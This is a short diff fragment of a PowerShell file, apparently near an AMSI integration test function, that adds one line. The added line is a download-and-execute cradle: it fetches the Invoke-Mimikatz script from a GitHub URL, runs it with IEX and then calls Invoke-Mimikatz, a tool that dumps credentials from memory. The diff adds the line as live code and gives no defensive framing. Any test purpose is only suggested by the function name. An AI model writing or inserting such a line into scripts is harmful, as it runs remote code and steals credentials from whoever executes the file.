@@ -387,4 +387,4 @@ function Test-AmsiIntegration {
 ==============
 
 
-
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
